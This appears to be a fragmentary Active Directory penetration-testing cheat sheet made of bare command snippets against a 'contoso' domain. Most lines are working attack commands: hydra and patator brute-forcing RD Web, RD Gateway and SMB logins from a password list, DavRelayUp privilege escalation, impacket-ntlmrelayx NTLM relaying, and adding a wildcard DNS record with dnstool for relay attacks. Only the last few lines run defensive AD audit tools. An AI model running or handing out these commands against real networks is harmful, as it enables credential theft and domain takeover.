...
sudo apt install python3-impacket impacket-scripts crackmapexec python3-pip -y
sudo pip3 install mitm6 minikerberos adidnsdump certipy bloodhound coercer
...
```bash
hydra -I -V -t 1 -l Admin -P passwords.txt -u gateway.contoso.com https-post-form "/RDWeb/Pages/en-US/login.aspx:DomainUserName=CONTOSO\\^USER^&UserPass=^PASS^:S=302"
```
...
```bash
patator rdp_gateway url=https://gateway.contoso.com/Rpc user_pass=Admin:FILE0 0=passwords.txt resolve=gateway.contoso.com:10.213.0.5 -x ignore:code=401 -x quit:code=503
```
...
```bash
patator smb_login host=contoso-dc port=445 user=Admin domain=CONTOSO password=FILE0 0=passwords.txt -x ignore:fgrep='STATUS_LOGON_FAILURE' -x quit:code=0
```
...
%temp%\DavRelayUp.exe -c -cn CONTOSO-PC4 -cp "Password123" -i Admin
```
...
sudo impacket-ntlmrelayx --target contoso-srv -smb2support --no-http-server --smb-port 8445
```
...
```bash
 python3 krbrelayx/dnstool.py --user 'CONTOSO\bfu' --password 'Pa$$w0rd' --action add --record '*'  --data 10.213.0.100 contoso-dc.contoso.com
 python3 krbrelayx/dnstool.py --user 'CONTOSO\bfu' --password 'Pa$$w0rd' --action query --record '*' contoso-dc.contoso.com
sudo impacket-ntlmrelayx --target ldap://contoso-dc.contoso.com
```
...
& '\\local\GOC213\PK Community 4.0\PurpleKnight.exe'
```
...
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
\\local\GOC213\ForestDruid-Community\ForestDruid.exe
```
...
```batchfile
\\local\GOC213\dsdetect\dsdetect.exe --server contoso-dc
```
